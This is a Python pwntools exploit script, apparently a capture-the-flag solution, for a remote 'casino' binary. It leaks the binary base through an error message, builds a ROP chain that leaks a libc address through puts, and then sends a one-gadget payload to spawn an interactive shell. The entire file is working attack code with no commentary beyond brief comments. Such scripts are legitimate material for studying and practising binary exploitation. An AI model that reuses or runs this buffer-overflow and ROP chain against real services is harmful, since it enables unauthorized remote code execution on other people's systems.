from pwn import *
from pwn import p64

IS_LOCAL = False
IS_DEBUG = False

INPUT_PATCHED_FILENAME = "casino_patched"
INPUT_ORIG_FILENAME = "casino"

REMOTE_HOST = ""
REMOTE_PORT = 31375

# setup terminal
context.terminal = ['tmux', 'new-window', '-F' '#{pane_pid}', '-P']
#run_in_new_terminal('bash')

if IS_LOCAL:
    if IS_DEBUG:
        io = process(INPUT_PATCHED_FILENAME, aslr=False)
        #break *0x555555400f2b
        #break *0x555555400f26
        pid, io_gdb = gdb.attach(io, api=True, gdbscript="""
            break *0x555555400f50
            continue
        """)
    else:
        io = process(INPUT_PATCHED_FILENAME)
else:
    io = remote(REMOTE_HOST, REMOTE_PORT)

def enter_game():
    io.recvuntil(b"> ")
    io.sendline(b"1")

def skip_main_games():
    gems = 69
    while gems > 6:
        # select "Rigged Roulette"
        io.recvuntil(b"> ")
        io.sendline(b"1")

        # send a wrong choice
        io.recvuntil(b"> ")
        io.sendline(b"-1")

        # adjust a gems count
        gems -= 6

def skip_additional_roulette():
    io.recvuntil(b"> ")
    io.sendline(b"1")

def get_image_base() -> int:
    io.recvuntil(b"> ")
    io.sendline(b".")

    s = io.recvline_contains(b"is not a valid number!")

    leak_bin_addr = int(s.split(b' ', 2)[1], 10)

    LOCAL_BIN_LEAK = 0x555555400b20
    LOCAL_IMAGE_BASE = 0x00555555400000
    IMAGE_BASE_OFFSET = LOCAL_BIN_LEAK - LOCAL_IMAGE_BASE

    image_base = leak_bin_addr - IMAGE_BASE_OFFSET
    return image_base

def exploit(image_base: int):
    io.recvuntil(b"> ")

    ret_addr = cyclic_find(b'oaaa')
    log.info(f'RET offset: {hex(ret_addr)}')

    # new_canary_offset = cyclic_find(b'kaaa')
    # log.info(f'New CANARY offset: {hex(new_canary_offset)}')

    # saved_canary_offset = cyclic_find(b'naav')
    # log.info(f'Saved CANARY offset: {hex(saved_canary_offset)}')

    elf = ELF(INPUT_ORIG_FILENAME)
    p_got_read = image_base + elf.got['read']
    p_plt_puts = image_base + elf.plt['puts']
    p_last_chance = image_base + elf.symbols['last_chance']

    # 0x00000000000018f3: pop rdi; ret;
    pop_rdi = image_base + 0x00000000000018f3

    # leak LIBC address
    payload = flat(
        {
            ret_addr: pop_rdi,
            ret_addr+0x8: p_got_read,
            ret_addr+0x10: p_plt_puts,
            ret_addr+0x18: p_last_chance#,
            #new_canary_offset: 0xAAAAAAAAAAAAAAAA,
            #saved_canary_offset: 0xAAAAAAAAAAAAAAAA
        },
        word_size = 64,
        filler = b'\0',
        length = 0x8F8
    )

    log.info('Sending the 1st exploit to get a LIBC address...')
    io.sendline(payload)
    recv_line = io.recvline()
    recv_line = io.recvline().strip()
    libc_leak = int.from_bytes(recv_line, 'little')

    LIBC_LOCAL_BASE = 0x7ffff77c3000
    LIBC_LOCAL_LEAK = 0x7ffff7bc5430
    LIBC_BASE_OFFSET = LIBC_LOCAL_LEAK - LIBC_LOCAL_BASE
    libc_base = libc_leak - LIBC_BASE_OFFSET
    io.info(f'LIBC base: {hex(libc_base)}')

    # ONE_GADGET_1 = libc_base + 0x4f3d5
    ONE_GADGET_2 = libc_base + 0x4f432
    # ONE_GADGET_3 = libc_base + 0x10a41c

    # leak LIBC address
    payload = flat(
        {
            ret_addr: ONE_GADGET_2#,
            #new_canary_offset: 0x0,
            #saved_canary_offset: 0x0
        },
        word_size = 64,
        filler = b'\0',
        length = 0x8F8
    )

    log.info('Sending the 2nd exploit with one gadget ROP...')
    io.sendline(payload)

log.info('Paying for the game to start...')
enter_game()

log.info('Skip main games...')
skip_main_games()

log.info('Skip additional game...')
skip_additional_roulette()

log.info('Trying to get binary image base...')
image_base = get_image_base()

log.info(f"Found binary image base: {hex(image_base)}")

log.info('Prepare exploit...')
exploit(image_base)

log.info('Spawning shell...')
io.interactive()
